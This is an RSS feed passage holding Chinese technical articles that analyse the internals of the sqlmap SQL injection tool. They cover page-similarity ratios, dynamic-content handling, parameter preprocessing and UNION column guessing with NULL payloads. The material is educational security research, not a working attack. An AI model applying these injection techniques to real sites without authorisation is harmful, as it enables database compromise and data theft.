在猜列数的时候，使用的是二分法（笔者看了一下，二分法这部分这似乎是七年前的代码）。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c8fa713e11133d2c091345e8dc9fc2a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1349&quot; data-rawheight=&quot;631&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c8fa713e11133d2c091345e8dc9fc2a5&quot; data-watermark-src=&quot;v2-16cf9c8de071ee650d2e9c30bfd68109&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;除此之外呢，如果 &lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; 失效，将会计算至少五个（从 &lt;code class=&quot;inline&quot;&gt;lowerCount&lt;/code&gt; 到 &lt;code class=&quot;inline&quot;&gt;upperCount&lt;/code&gt;）Payload 为 &lt;code class=&quot;inline&quot;&gt;UNION SELECT (NULL,) * [COUNT]&lt;/code&gt;，的请求，这些请求的对应 RATIO（与模版页面相似度）会汇总存储在 &lt;code class=&quot;inline&quot;&gt;ratios&lt;/code&gt; 中，同时 &lt;code class=&quot;inline&quot;&gt;items&lt;/code&gt; 中存储 &lt;code class=&quot;inline&quot;&gt;列数 和 ratio&lt;/code&gt; 形成的 &lt;code class=&quot;inline&quot;&gt;tuple&lt;/code&gt;，经过一系列的算法，尽可能寻找出“与众不同（正确猜到列数）”的页面。具体的算法与批注如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9ece5b4a703e99bd41426ac3912dbe0e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1427&quot; data-rawheight=&quot;702&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ece5b4a703e99bd41426ac3912dbe0e&quot; data-watermark-src=&quot;v2-b38dc8a4df45594a0df0b4d234fbf36a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们发现，上面代码表达的核心思想就是 &lt;b&gt;利用与模版页面比较的内容相似度寻找最最不同的那一个请求&lt;/b&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;定位输出点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;假如一切顺利，我们通过上面的步骤成功找到了列数，接下来就应该寻找输出点，当然输出点的寻找也是需要额外讨论的。其实基本逻辑很容易对不对？我们只需要将 &lt;code class=&quot;inline&quot;&gt;UNION SELECT NULL, NULL, NULL, NULL, ...&lt;/code&gt; 中的各种 &lt;code class=&quot;inline&quot;&gt;NULL&lt;/code&gt; 依次替换，然后在结果中寻找被我们插入的随机的字符串，就可以很容易定位到输入出点的位置。实际上这一部分的确认逻辑是位于下图中的函数的 &lt;code class=&quot;inline&quot;&gt;_unionConfirm&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e3b392f7ef6cd59242acadc60c82d38b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;783&quot; data-rawheight=&quot;441&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e3b392f7ef6cd59242acadc60c82d38b&quot; data-watermark-src=&quot;v2-98d8b68fa58780554eece325888eb731&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中主要的逻辑是一个叫 &lt;code class=&quot;inline&quot;&gt;_unionPosition&lt;/code&gt; 的函数，在这个函数中，负责定位输出点的位置，使用的基本方法就是我们在开头提到方法，受限于篇幅，我们就不再展开叙述了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;其实按笔者原计划，本系列文章并没有结束，因为还有关于 sqlmap 中其他技术没有介绍：“数据持久化”，“action() - Exploit 技术”，“常见漏洞利用分析（udf，反弹 shell 等）”。但是由于内容是在太过庞杂，笔者计划暂且搁置一下，实际上现有的文章已经足够把 sqlmap 的 SQL 注入检测最核心的也是最有意义的自动化逻辑说清楚了，我想读读者读完之后肯定会有自己的收获。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 再见👋&lt;/b&gt;&lt;/h2&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-09-25-45291193</guid>
<pubDate>Tue, 25 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap 内核分析 II: 核心原理-页面相似度算法实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-10-44157153.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/44157153&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8189a97bf692ad57084cd2d670824522_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在上一篇文章中，我们在 &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; 中戛然而止于 &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; 这一个概念；但是在本文，笔者会详细介绍 &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; 对于 sqlmap 整个系统的重要意义和用法，除此之外还会指出一些 sqlmap 的核心逻辑和一些拓展性的功能。包含：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;identityWaf&lt;/li&gt;&lt;li&gt;nullConnection (checkNullConnection)&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x00 PageRatio 是什么？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;要说 PageRatio 是什么，我们可能需要先介绍另一个模块 &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt;。这个模块是在 sqlmap 中用来计算页面的相似度的基础模块，实际处理的时候，sqlmap 并不仅仅是直接计算页面的相似度，而是通过首先对页面进行一些预处理，预处理之后，根据预设的阈值来计算请求页面和模版页面的相似度。&lt;/p&gt;&lt;p&gt;对于 &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt; 模块其实本身并没有什么非常特殊的，详细参见&lt;a href=&quot;https://docs.python.org/2/library/difflib.html&quot;&gt;官方手册&lt;/a&gt;，实际在使用的过程中，sqlmap 主要使用其 &lt;code class=&quot;inline&quot;&gt;SequenceMatcher&lt;/code&gt; 这个类。以下是关于这个类的简单介绍：&lt;/p&gt;&lt;blockquote&gt;This is a flexible class for comparing pairs of sequences of any type, so long as the sequence elements are hashable. The basic algorithm predates, and is a little fancier than, an algorithm published in the late 1980’s by Ratcliff and Obershelp under the hyperbolic name “gestalt pattern matching.” The idea is to find the longest contiguous matching subsequence that contains no “junk” elements (the Ratcliff and Obershelp algorithm doesn’t address junk). The same idea is then applied recursively to the pieces of the sequences to the left and to the right of the matching subsequence. This does not yield minimal edit sequences, but does tend to yield matches that “look right” to people.&lt;/blockquote&gt;&lt;p&gt;简单来说这个类使用了 Ratcliff 和 Obershelp 提供的算法，匹配最长相同的字符串，设定无关字符（junk）。在实际使用中，他们应用最多的方法应该就是 &lt;code class=&quot;inline&quot;&gt;ratio()&lt;/code&gt;。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e5dbeda98af8e9230aa17a3cdd8ceba7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1589&quot; data-rawheight=&quot;139&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据文档中的描述，这个方法返回两段文本的相似度，相似度的算法如下：我们假设两段文本分别为 &lt;code class=&quot;inline&quot;&gt;text1&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;text2&lt;/code&gt;，他们相同的部分长度总共为 &lt;code class=&quot;inline&quot;&gt;M&lt;/code&gt;，这两段文本长度之和为 &lt;code class=&quot;inline&quot;&gt;T&lt;/code&gt;，那么这两段文本的相似度定义为 &lt;code class=&quot;inline&quot;&gt;2.0 * M / T&lt;/code&gt;，这个相似度的值在 0 到 1.0 之间。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;PageRatio 的小例子&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4ca7c268277f6f9afbe5b194d24796dc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;481&quot; data-rawheight=&quot;229&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4ca7c268277f6f9afbe5b194d24796dc&quot; data-watermark-src=&quot;v2-284abfab7f0d229fa22bf82cae412512&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们通过上面的介绍，知道了对于 &lt;code class=&quot;inline&quot;&gt;abcdefg&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;abce123&lt;/code&gt; 我们计算的结果应该是 &lt;code class=&quot;inline&quot;&gt;2.0 * 4 / 14&lt;/code&gt; 所以计算结果应该是：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33d7ed32fcaeee58a5f0b418666567f0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;233&quot; data-rawheight=&quot;37&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;到现在我们理解了 PageRatio 是什么样的一种算法，我们就可以开始观察 sqlmap 是如何使用这一个值的了～&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 RATIO in checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在上节的内容中，我们对于 sqlmap 的源码了解到 &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; 的部分，结合刚才讲的 PageRatio 的例子，我们直接可以看懂这部分代码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0daf035189288e98edbec8cf7cb500f8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1186&quot; data-rawheight=&quot;185&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;现在设定 &lt;code class=&quot;inline&quot;&gt;IDS_WAF_CHECK_RATIO = 0.5&lt;/code&gt; 表明，只要打了检测 IDS/WAF 的 Payload 的页面结果与模版页面结果文本页面经过一定处理，最后比较出相似度相差 0.5 就可以认为触发了 IDS/WAF。&lt;/p&gt;&lt;p&gt;与 &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; 相关的其实还有 &lt;code class=&quot;inline&quot;&gt;identityWaf&lt;/code&gt;, 但是这个方法太简单了我们并不想仔细分析，有兴趣的读者可以自行了解一下，本文选择直接跳过这一个步骤。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 checkStability&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数其实是在检查原始页面是存在动态内容，并做一些处理。何为动态内容？在 sqlmap 中表示以同样的方式访问量次同一个页面，访问前后页面内容并不是完全相同，他们相差的内容属于动态内容。当然，sqlmap 的处理方式也并不是随意的比较两个页面就没有然后了，在比较完之后，如果存在动态页面，还会做一部分的处理，或者提出扩展设置（&lt;code class=&quot;inline&quot;&gt;--string/--regex&lt;/code&gt;），以方便后续使用。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1440e57d7b4efd880a250213aa64f20e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1184&quot; data-rawheight=&quot;780&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1440e57d7b4efd880a250213aa64f20e&quot; data-watermark-src=&quot;v2-fbc8433d6a32ac6eb6edb03beb65f110&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们发现，实际的 sqlmap 源码确实是按照我们介绍的内容处理的，如果页面内容是动态的话，则会提示用户处理字符串或者增加正则表达式来验证页面。&lt;/p&gt;&lt;blockquote&gt;默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;checkDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们发现，如果说我们并没指定 &lt;code class=&quot;inline&quot;&gt;string / regex&lt;/code&gt; 那么很多情况，我们仍然也可以正确得出结果；根据 sqlmap 源码，它实际上背后还是有一些处理方法的，而这些方法就在 &lt;code class=&quot;inline&quot;&gt;checkDynamicContent(firstPage, secondPage)&lt;/code&gt; 中：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d809fdef4992d3325d0eb191a29b70a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1188&quot; data-rawheight=&quot;699&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-5d809fdef4992d3325d0eb191a29b70a&quot; data-watermark-src=&quot;v2-42eaf7b0265856ba73b5d5345e111776&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们在这个函数中发现如果 &lt;code class=&quot;inline&quot;&gt;firstPage 和 secondPage&lt;/code&gt; 的相似度小于 0.98 （这个相似度的概念就是前一节介绍的 PageRatio 的概念），则会重试，并且尝试 &lt;code class=&quot;inline&quot;&gt;findDynamicContent(firstPage, secondPage)&lt;/code&gt; 然后细化页面究竟是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 还是 &lt;code class=&quot;inline&quot;&gt;heavily dynamic&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;如果页面是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 则提示启用 &lt;code class=&quot;inline&quot;&gt;--text-only&lt;/code&gt; 选项：&lt;/p&gt;&lt;blockquote&gt;有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用--text-only（HTTP响应体中不同）--titles（HTML的title标签中不同）。&lt;/blockquote&gt;&lt;p&gt;如果页面仅仅是显示 &lt;code class=&quot;inline&quot;&gt;heavy dynamic&lt;/code&gt; 的话，sqlmap 会不断重试直到区分出到底是 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 还是普通的可以接受的动态页面（相似度大于 0.98）。&lt;/p&gt;&lt;p&gt;对于 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt; 与可以接受的动态页面（相似度高于 0.98），其实最根本的区别就是在于 PageRatio, 如果多次尝试（超过 conf.retries） 设置的尝试次数，仍然出现了相似度低于 0.98 则会认为这个页面 &lt;code class=&quot;inline&quot;&gt;too dynamic&lt;/code&gt;。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;findDynamicContent(firstPage, secondPage)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数位于 &lt;code class=&quot;inline&quot;&gt;common.py&lt;/code&gt; 中，这个函数作为通用函数，我们并不需要非常严格的去审他的源码，为了节省大家的时候，笔者在这里可以描述这个函数做了一件什么样的事情，并举例说明。&lt;/p&gt;&lt;p&gt;这个函数按函数名来解释其实是，寻找动态的页面内容。&lt;/p&gt;&lt;p&gt;实际在工作中，如果寻找到动态内容，则会将动态内容的前后内容（前：&lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt;，后：&lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;，长度均在 &lt;code class=&quot;inline&quot;&gt;DYNAMICITY_BOUNDARY_LENGTH&lt;/code&gt; 中设定，默认为 20）作为一个 tuple，存入 &lt;code class=&quot;inline&quot;&gt;kb.dynamicMarkings&lt;/code&gt;，在每一次页面比较之前，会默认移除这些动态内容。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;kb.dynamicMarkings.append((prefix if prefix else None, suffix if suffix else None))&lt;/code&gt;&lt;p&gt;例如，在实际使用中，我们按照官方给定的一个例子：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    &quot;&quot;&quot;
    This function checks if the provided pages have dynamic content. If they
    are dynamic, proper markings will be made
                          
    &amp;gt;&amp;gt;&amp;gt; findDynamicContent(&quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;, 
                           &quot;Lorem ipsum dolor sit amet, congue tation referrentur ei sed. Ne nec legimus habemus recusabo, natum reque et per. &amp;lt;script src=&#39;ads.js&#39;&amp;gt;&amp;lt;/script&amp;gt;Facer tritani reprehendunt eos id, modus constituam est te. Usu sumo indoctum ad, pri paulo molestiae complectitur no.&quot;)
    &amp;gt;&amp;gt;&amp;gt; kb.dynamicMarkings
    [(&#39;natum reque et per. &#39;, &#39;Facer tritani repreh&#39;)]
    &quot;&quot;&quot;&lt;/code&gt;&lt;p&gt;根据观察，两段文本差别在 &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; 标签，标记的动态内容应该是 &lt;code class=&quot;inline&quot;&gt;script&lt;/code&gt; 标签，所以动态内容的前 20 字节的文本座位 &lt;code class=&quot;inline&quot;&gt;prefix&lt;/code&gt; 后 20 字节的文本作为 &lt;code class=&quot;inline&quot;&gt;suffix&lt;/code&gt;，分别为：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;prefix: &lt;code class=&quot;inline&quot;&gt;&#39;natum reque et per. &#39;&lt;/code&gt;&lt;/li&gt;&lt;li&gt;suffix: &lt;code class=&quot;inline&quot;&gt;&#39;Facer tritani repreh&#39;&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x03 中场休息与阶段性总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们虽然之分析了两个大函数，但是整个判断页面相应内容的核心原理应该是已经非常清晰了；可能有些读者反馈我们的进度略慢，但是其实这好比一个打基础的过程，我们基础越扎实对 sqlmap 越熟悉，分析后面的部分就越快。&lt;/p&gt;&lt;p&gt;为了更好的继续，我们需要回顾一下之前的流程图&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09f240e25764349996a613036b3e4b0a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;660&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09f240e25764349996a613036b3e4b0a&quot; data-watermark-src=&quot;v2-c58c5090cd22742c8b9f9698636c40c3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;好的，接下来我们的目标就是图中描述的部分“过滤重复以及不需要检查的参数，然后检查参数是为动态参数”，在下一篇文章中，我们将会详细介绍 sqlmap 其他的核心函数，诸如启发式检测，和 sql 注入检测核心函数。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 参数预处理以及动态参数检查&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;参数预处理&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;参数预处理包含如下步骤：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;参数排序&lt;br&gt;# Order of testing list (first to last)&lt;br&gt;orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)&lt;br&gt;​&lt;br&gt;for place in orderList[::-1]:&lt;br&gt; if place in parameters:&lt;br&gt; parameters.remove(place)&lt;br&gt; parameters.insert(0, place)&lt;/li&gt;&lt;li&gt;参数分级检查&lt;br&gt;&lt;br&gt;for place in parameters:&lt;br&gt; # Test User-Agent and Referer headers only if&lt;br&gt; # --level &amp;gt;= 3&lt;br&gt; skip = (place == PLACE.USER_AGENT and conf.level &amp;lt; 3)&lt;br&gt; skip |= (place == PLACE.REFERER and conf.level &amp;lt; 3)&lt;br&gt;​&lt;br&gt; # Test Host header only if&lt;br&gt; # --level &amp;gt;= 5&lt;br&gt; skip |= (place == PLACE.HOST and conf.level &amp;lt; 5)&lt;br&gt;​&lt;br&gt; # Test Cookie header only if --level &amp;gt;= 2&lt;br&gt; skip |= (place == PLACE.COOKIE and conf.level &amp;lt; 2)&lt;br&gt;​&lt;br&gt; skip |= (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.COOKIE and intersect(PLACE.COOKIE, conf.skip, True) not in ([], None))&lt;br&gt; skip |= (place == PLACE.HOST and intersect(PLACE.HOST, conf.skip, True) not in ([], None))&lt;br&gt;​&lt;br&gt; skip &amp;amp;= not (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.HOST and intersect(HOST_ALIASES, conf.testParameter, True))&lt;br&gt; skip &amp;amp;= not (place == PLACE.COOKIE and intersect((PLACE.COOKIE,), conf.testParameter, True))&lt;br&gt;​&lt;br&gt; if skip:&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; if kb.testOnlyCustom and place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER):&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; if place not in conf.paramDict:&lt;br&gt; continue&lt;br&gt;​&lt;br&gt; paramDict = conf.paramDict[place]&lt;br&gt;​&lt;br&gt; paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place&lt;/li&gt;&lt;li&gt;参数过滤&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3449ea6acc9fc11700479e927f570242_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1490&quot; data-rawheight=&quot;728&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3449ea6acc9fc11700479e927f570242&quot; data-watermark-src=&quot;v2-ff650ae113fc375acf08cf0865584366&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;checkDynParam(place, parameter, value)&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们进入 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; 函数发现，整个函数其实看起来非常简单，但是实际上我们发现 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 这个函数现在又返回了一个好像是 Bool 值的返回值作为 &lt;code class=&quot;inline&quot;&gt;dynResult&lt;/code&gt; 这令我们非常困惑，我们上一次见这个函数返回的是 &lt;code class=&quot;inline&quot;&gt;(page, headers, code)&lt;/code&gt; 。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b16ff2abb515c255ba3be9619c11251d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1117&quot; data-rawheight=&quot;664&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b16ff2abb515c255ba3be9619c11251d&quot; data-watermark-src=&quot;v2-eb0503c02fa3ede2b68a866725b03bed&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们发现实际上的页面比较逻辑也并不是在 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; ，所以表面上，我们这一节的内容是在 &lt;code class=&quot;inline&quot;&gt;checkDynParam&lt;/code&gt; 这个函数，但是实际上我们仍然需要跟进到 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;那么，等什么呢？继续吧！&lt;/p&gt;&lt;h2&gt;&lt;b&gt;agent.queryPage 与 comparison&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;跟进 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 我相信一定是痛苦的，这其实算是 sqlmap 的核心基础函数之一，里面包含了接近三四百行的请求前预处理，包含 &lt;code class=&quot;inline&quot;&gt;tamper&lt;/code&gt; 的处理逻辑以及随机化参数和 CSRF 参数的处理检测逻辑。同时如果涉及到了 &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; 还包含着时间盲注的处理逻辑；除此之外，一般情况下 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 中还存在着针对页面比较的核心调用，页面对比对应函数为 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt;。为了简化大家的负担，笔者只截取最后返回值的部分 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-31010288239691eb6dbbbbeaa5f4d255_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1620&quot; data-rawheight=&quot;424&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-31010288239691eb6dbbbbeaa5f4d255&quot; data-watermark-src=&quot;v2-f06c7f596d8bd6637e5dc5d992635f19&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在标注中，我们发现了我们之前的疑问，为什么 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 时而返回页面内容，时而返回页面与模版页面的比较结果。其实在于如果 &lt;code class=&quot;inline&quot;&gt;content/response&lt;/code&gt; 被设置为 &lt;code class=&quot;inline&quot;&gt;True&lt;/code&gt; 的时候，则会返回页面具体内容，headers，以及响应码；如果 &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; 被设定的时候，返回是否发生了延迟；默认情况返回与模版页面的比较结果。&lt;/p&gt;&lt;p&gt;我们发现这一个 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 函数很奇怪，他没有输入两个页面的内容，而是仅仅输入当前页面的相关信息，但是为什么笔者要明确说是与“模版页面”的比较结果呢？我们马上就跟入 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 一探究竟。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e87a24d60d2cbb3614eecfd760d55c6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1077&quot; data-rawheight=&quot;449&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e87a24d60d2cbb3614eecfd760d55c6b&quot; data-watermark-src=&quot;v2-3a5937b488503b66381fb28faea64e7b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;进去之后根据图中的调用关系，我们主要需要观察一下 &lt;code class=&quot;inline&quot;&gt;_comparison&lt;/code&gt; 这个函数的行为。当打开这个函数的时候，我们发现也是一段接近一百行的函数，仍然是一个需要硬着头皮看下去的一段代码。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6bbd0c8d31d584f2b44c3d56b1ddc513_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1112&quot; data-rawheight=&quot;587&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6bbd0c8d31d584f2b44c3d56b1ddc513&quot; data-watermark-src=&quot;v2-ae634362bd18d5ac79886e5721995c28&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据图中的使用红色方框框住的代码，我们很容易就能发现，这其实是在禁用 &lt;code class=&quot;inline&quot;&gt;PageRatio&lt;/code&gt; 的页面相似度算法，而是因为用户设定了 &lt;code class=&quot;inline&quot;&gt;--string/--not-string/--regex/--code&lt;/code&gt; 从而可以明确从其他方面区分出页面为什么不同。当然，我们的重点并不是他，而是计算 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 并且使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 得出页面相似的具体逻辑。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9d3093ad48167b9ec3f755d23f26b274_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;822&quot; data-rawheight=&quot;487&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9d3093ad48167b9ec3f755d23f26b274&quot; data-watermark-src=&quot;v2-27af2f2d71d73d24571e676a27ea0074&quot; 